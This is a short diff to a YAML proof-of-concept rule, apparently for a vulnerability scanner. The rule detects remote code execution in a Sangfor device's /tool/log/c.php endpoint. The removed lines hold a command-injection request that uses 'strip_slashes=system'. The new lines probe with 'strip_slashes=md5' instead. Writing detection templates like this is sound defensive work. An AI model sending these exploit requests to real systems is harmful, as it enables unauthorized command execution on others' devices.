@@ -1,15 +1,11 @@
 name: poc-yaml-sangfor-ba-rce
 set:
   r1: randomLowercase(8)
-  r2: randomLowercase(8)
-  r3: randomLowercase(8)
-  r4: randomLowercase(8)
 rules:
   - method: GET
-    path: /tool/log/c.php?strip_slashes=system&host=echo%20{{r1}}${{{r2}}}{{r3}}^{{r4}}
-    follow_redirects: false
+    path: /tool/log/c.php?strip_slashes=md5&host={{r1}}
     expression: |
-      response.status == 200 && (response.body.bcontains(bytes(r1 + r3 + "^" + r4)) || response.body.bcontains(bytes(r1 + "${" + r2 + "}" + r3 + r4)))
+      response.status == 200 && response.content_type.contains("text/html") && response.body.bcontains(bytes(md5(r1)))
 
 detail:
   author: Print1n(http://print1n.top)
